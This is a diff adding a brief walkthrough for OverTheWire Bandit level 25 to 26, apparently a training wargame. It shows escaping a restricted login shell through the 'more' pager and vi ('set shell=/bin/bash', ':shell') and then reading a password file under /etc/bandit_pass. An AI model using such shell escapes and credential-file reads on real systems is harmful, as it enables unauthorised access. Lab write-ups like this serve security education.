@@ -1,0 +1,20 @@
+OverTheWire Bandit: Level 25 → 26
+
+Objective
+Obtain the password for Level 26.
+The login shell for bandit26 is restricted, but an SSH private key is provided and can be abused using a pager escape.
+
+Steps
+Log in as bandit25:
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+Use the provided SSH key to log in as bandit26:
+ssh bandit26@localhost -i bandit26.sshkey
+When the pager (more) opens, resize the terminal to trigger it, then escape to a shell:
+v
+:set shell=/bin/bash
+:shell
+Read the password file:
+cat /etc/bandit_pass/bandit26
+
+Result
+The password for Bandit Level 26 is displayed.
